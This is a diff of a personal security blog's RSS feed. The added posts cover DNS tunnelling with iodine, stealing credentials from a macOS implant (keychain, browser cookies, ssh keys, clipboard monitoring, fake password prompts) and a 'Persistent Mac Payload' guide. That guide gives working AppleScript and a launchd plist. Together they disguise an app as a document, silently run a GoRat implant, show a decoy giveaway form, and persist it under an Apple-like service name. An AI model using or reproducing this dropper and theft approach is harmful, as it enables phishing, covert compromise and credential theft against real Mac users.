+&lt;p&gt;Now to get DNS traffic to our &lt;code&gt;ns.testeroni.com&lt;/code&gt; host, we need to configure it to be the resolver for a subdomain we setup. For example, our subdomain can be called &lt;code&gt;s.testeroni.com&lt;/code&gt;, any requests to resolve &lt;code&gt;[somehost].s.testeroni.com&lt;/code&gt; will go to a specified name server. In this case, we will sit it to &lt;code&gt;ns.testeroni.com&lt;/code&gt;.
+|Type |Host |Value | TTL |
+|NS Record | s | ns.potato.monster. | Auto |&lt;/p&gt;
+&lt;p&gt;Just as a recap, we have a subdomain called &lt;code&gt;s&lt;/code&gt; of our domain &lt;code&gt;testeroni.com&lt;/code&gt;. Any host information is specified before &lt;code&gt;s.testeroni.com&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;start-up-the-server&#34;&gt;Start up the server &lt;a href=&#34;#start-up-the-server&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iodined  -f -c -P &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;password&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; 192.168.77.1 s.testeroni.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will start with the &lt;code&gt;-f&lt;/code&gt; option to start iodined in the foreground; this is going to help with troubleshooting. &lt;code&gt;-c&lt;/code&gt; is used for compression, &lt;code&gt;-P&lt;/code&gt; is to specify the password.
+The IP address is the address you want for the &lt;em&gt;tunnel&lt;/em&gt;. This should be a different subnet than your local network. You use these IPs to communicate between the two hosts through the tunnel.&lt;/p&gt;
+&lt;h2 id=&#34;start-the-client-program&#34;&gt;Start the client program &lt;a href=&#34;#start-the-client-program&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iodine -f -P &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;password&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; s.testeroni.com
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here, we start the client program with a similar command, but note the lack of the d for daemon at the end. The client program will attempt to connect to the server using just DNS. Data will be encoded in the host section of the subdomain like so &lt;code&gt;[data].s.testeroni.com&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&#34;test-the-connection&#34;&gt;Test the connection &lt;a href=&#34;#test-the-connection&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;To test if the tunnel is configured properly, try using the following command from your client (and vice versa):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping &amp;lt;tunnel-IP-of-server&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Any traffic that you need tunneled through DNS can simply be directed towards the server&amp;rsquo;s tunnel IP. For specific application traffic to be forwarded, configure proxies (see http or SOCKS proxies) that will handle requests using the less restricted server side.&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2021/05/19/iodine/</guid>
+      <pubDate>Wed, 19 May 2021 10:08:56 -0800</pubDate>
+    </item>
+    
+    <item>
+      <title>My First Post</title>
+      <link>https://potat0ast.com/2021/01/05/my-first-post/</link>
+      <description>&lt;p&gt;Hello and welcome to la blog&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  print(x)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://potat0ast.com/posts/my-first-post/picture1.png&#34; alt=&#34;pic caption=hello&#34; loading=&#34;lazy&#34; /&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Figure 1: Sandwich&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;p style=&#34;color:yellow&#34;&gt;Colorful text!&lt;/p&gt;
+This is shortcode text
+
+&lt;a href=&#34;https://potat0ast.com/2019/03/05/emoji-support/&#34;&gt;emoji_page&lt;/a&gt;
+&lt;div class=&#34;box&#34;&gt;
+  &lt;iframe src=&#34;https://potat0ast.com/2019/03/05/emoji-support/&#34;&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+
+hello &lt;a href=&#34;https://svl.sh/oob-dns/&#34;&gt;test&lt;/a&gt;
+&lt;div class=&#34;box&#34;&gt;
+  &lt;iframe src=&#34;https://svl.sh/oob-dns/&#34;&gt;
+  &lt;/iframe&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/2021/01/05/my-first-post/</guid>
       <pubDate>Tue, 05 Jan 2021 21:55:56 -0800</pubDate>
-      
-      <guid>https://potat0ast.com/tags/</guid>
-      <description></description>
     </item>
     
     <item>
-      <title>test</title>
-      <link>https://potat0ast.com/tags/test/</link>
-      <pubDate>Tue, 05 Jan 2021 21:55:56 -0800</pubDate>
-      
-      <guid>https://potat0ast.com/tags/test/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>welcome</title>
-      <link>https://potat0ast.com/tags/welcome/</link>
-      <pubDate>Tue, 05 Jan 2021 21:55:56 -0800</pubDate>
-      
-      <guid>https://potat0ast.com/tags/welcome/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>css</title>
-      <link>https://potat0ast.com/tags/css/</link>
-      <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/css/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>html</title>
-      <link>https://potat0ast.com/tags/html/</link>
-      <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/html/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>markdown</title>
-      <link>https://potat0ast.com/tags/markdown/</link>
-      <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/markdown/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>themes</title>
-      <link>https://potat0ast.com/tags/themes/</link>
-      <pubDate>Mon, 11 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/themes/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>privacy</title>
-      <link>https://potat0ast.com/tags/privacy/</link>
-      <pubDate>Sun, 10 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/privacy/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>shortcodes</title>
-      <link>https://potat0ast.com/tags/shortcodes/</link>
-      <pubDate>Sun, 10 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/shortcodes/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>text</title>
-      <link>https://potat0ast.com/tags/text/</link>
-      <pubDate>Sat, 09 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/text/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>emoji</title>
-      <link>https://potat0ast.com/tags/emoji/</link>
-      <pubDate>Tue, 05 Mar 2019 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/tags/emoji/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>999</title>
-      <link>https://potat0ast.com/999/</link>
+      <title></title>
+      <link>https://potat0ast.com/1/01/01/pasteboard_monitor/</link>
+      <description>&lt;h2 id=&#34;pasteboard-monitor&#34;&gt;Pasteboard Monitor &lt;a href=&#34;#pasteboard-monitor&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;With an OS X implant up and running, my team and I were looking for ways to gain additional access. The primary things we had to look at once on the system were:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;system keychain (but would need the password to decrypt)&lt;/li&gt;
+&lt;li&gt;Web browser cookies&lt;/li&gt;
+&lt;li&gt;shell history&lt;/li&gt;
+&lt;li&gt;.aws directory and other similar config files&lt;/li&gt;
+&lt;li&gt;ssh keys&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Note: ChromeCookieDecryptor rewrite to loop through items lol.&lt;/p&gt;
+&lt;p&gt;Going through the list, it is actually fairly easy to simply pull most of these items off of the computer. The chrome cookies, however, are protected by a master key which is likely stored in the system keychain. And the system keychain, will need a user password to decrypt.
+At the end of the day, we are probably going to want the user&amp;rsquo;s password. The first option we have is a fairly standard methodology. Create a prompt with JXA or Applescript that prompts the user for their password. Either the password is returned to the console that the attacker controls, or it is written to a file that the attacker can read later. This is a pretty elegant solution; just use the weak squishy human brain to get to the credentials.
+&lt;strong&gt;INSERT IMAGE of the popup&lt;/strong&gt;
+However, there are serious shortcumings to this solution. The function that produces the popup is abstracted and easy to use for us, the person writing the code. However, our options to make it look legitimate are heavily limited. There is a reason why the popup looks the way it does (and no, generally hackers don&amp;rsquo;t get lazy about their TTPs). We are limited to just one text box, rather than perhaps having one with a username and password (like an actual sudo prompt) and we can only have a limited set of buttons. Additionally, we can&amp;rsquo;t label the text boxes with something like &amp;ldquo;username&amp;rdquo; or &amp;ldquo;password&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;How else can we get the password? Well there is grabbing the hash and attempting to crack it. A very legitimate solution but it will require root (maybe obtain it by getting the user to run a process as root, then use this to grab the hash).&lt;/p&gt;
+&lt;p&gt;Finally, there is the pasteboard. Maybe this individual uses a password manager or simply keeps their password in a note on the system (okay maybe just find this note if this was the case). The pasteboard is a very intersting approach because we don&amp;rsquo;t need special permissions, it won&amp;rsquo;t cause any TCC pop-up, and the information you can glean won&amp;rsquo;t be limited to the system credentials.&lt;/p&gt;
+</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/1/01/01/pasteboard_monitor/</guid>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/999/</guid>
-      <description></description>
     </item>
     
     <item>
-      <title>Categories</title>
-      <link>https://potat0ast.com/categories/</link>
+      <title></title>
+      <link>https://potat0ast.com/1/01/01/persistent_mac_payload/</link>
+      <description>&lt;h1 id=&#34;persistent-mac-payload&#34;&gt;Persistent Mac Payload &lt;a href=&#34;#persistent-mac-payload&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h1&gt;
+&lt;h3 id=&#34;app-bundle-disguised&#34;&gt;App Bundle Disguised &lt;a href=&#34;#app-bundle-disguised&#34; class=&#34;hash&#34;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;This is most easily performed if you have a Mac to create the payload on. We will be disguising the app as a document file, but you can do anything as long as you have the appropriate icon.
+The application structure will look something like this (only the components we are worried about will be indicated. A lot of the other files and directories come standard with the app bundle:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;(D) phishLoad.app
+&lt;ul&gt;
+&lt;li&gt;(D) Contents
+&lt;ul&gt;
+&lt;li&gt;GoRat Binary&lt;/li&gt;
+&lt;li&gt;launchAgent.plist&lt;/li&gt;
+&lt;li&gt;dummy.docx&lt;/li&gt;
+&lt;li&gt;(D) Resources
+&lt;ul&gt;
+&lt;li&gt;applet.icns&lt;/li&gt;
+&lt;li&gt;(D) Scripts
+&lt;ul&gt;
+&lt;li&gt;main.scpt&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;To begin, open &amp;ldquo;Script Editor&amp;rdquo; and copy and paste the script included below. See the comments to understand the different statements used in the script. When saving the script, make sure to save it as an &amp;ldquo;Application&amp;rdquo; under File Format.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-applescript&#34; data-lang=&#34;applescript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set myPath to path to me as text # creates and sets the myPath variable to be the path to the app&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#if myPath ends with &amp;#34;:&amp;#34; then # depending on whether or not the path ends with a colon, set the offset to get the current app&amp;#39;s name&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	set n to -2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	set n to -1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#end if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set AppleScript&amp;#39;s text item delimiters to &amp;#34;:&amp;#34; # set the delimiters to be colons as used in the myPath variable&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set myName to text item n of myPath # set myName variable to the nth item, which should be the [appName].app&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#if (myName contains &amp;#34;.&amp;#34;) then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	set AppleScript&amp;#39;s text item delimiters to &amp;#34;.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#	set myName to text item -2 of myName&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#end if # get just the name before the .app&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# the section above is useful to create a variable with the app&amp;#39;s name&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do shell script &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILE=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (path to &lt;span style=&#34;color:#66d9ef&#34;&gt;me&lt;/span&gt;)&amp;#39;s POSIX &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;&amp;#39;s quoted form &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; # get the path to current directory
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd $FILE || exit; chmod +x ./Contents/auditd; ./Contents/auditd &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# cd to directory and execute implant&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do shell script &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILE=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (path to &lt;span style=&#34;color:#66d9ef&#34;&gt;me&lt;/span&gt;)&amp;#39;s POSIX &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;&amp;#39;s quoted form &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd $FILE || exit; open ./Contents/Independence-Day-Swag-Giveaway-Form2021.docx &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# open decoy docx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do shell script &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILE=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (path to &lt;span style=&#34;color:#66d9ef&#34;&gt;me&lt;/span&gt;)&amp;#39;s POSIX &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;&amp;#39;s quoted form &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd $FILE || exit; mkdir -p ~/Library/StartupItems/; mkdir -p ~/Library/LaunchAgents/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# create payload directories in case they don&amp;#39;t exist&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do shell script &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILE=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (path to &lt;span style=&#34;color:#66d9ef&#34;&gt;me&lt;/span&gt;)&amp;#39;s POSIX &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;&amp;#39;s quoted form &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd $FILE || exit; cp -r ./Contents/auditd ~/Library/StartupItems/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# copy payload to persistence destination&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do shell script &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;FILE=&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; (path to &lt;span style=&#34;color:#66d9ef&#34;&gt;me&lt;/span&gt;)&amp;#39;s POSIX &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;&amp;#39;s quoted form &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;cd $FILE || exit; cp -r ./Contents/com.apple.auditd.plist ~/Library/LaunchAgents/; launchctl load ~/Library/LaunchAgents/com.apple.auditd.plist &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# copy plist to destination and create persistent service&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The following plust defines the service that will start the GoRat payload on boot. Use &lt;code&gt;launchctl load [path to plist]&lt;/code&gt; to have the service start automatically on each boot (and the first time without reboot since RunAtLoad is set).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;dict&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;string&amp;gt;auditd&amp;lt;/string&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;array&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;string&amp;gt;zsh&amp;lt;/string&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;string&amp;gt;~/Library/StartupItems/auditd&amp;lt;/string&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;lt;string&amp;gt;--no-window&amp;lt;/string&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &amp;lt;/array&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;key&amp;gt;RunAtLoad&amp;lt;/key&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &amp;lt;true/&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;/dict&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/plist&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+      <author>ronalds.vilcins@gmail.com (Ronalds Vilcins)</author>
+      <guid>https://potat0ast.com/1/01/01/persistent_mac_payload/</guid>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/categories/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>En-Us</title>
-      <link>https://potat0ast.com/en-us/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/en-us/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>Series</title>
-      <link>https://potat0ast.com/series/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/series/</guid>
-      <description></description>
-    </item>
-    
-    <item>
-      <title>True</title>
-      <link>https://potat0ast.com/true/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>https://potat0ast.com/true/</guid>
-      <description></description>
     </item>
     
   </channel>
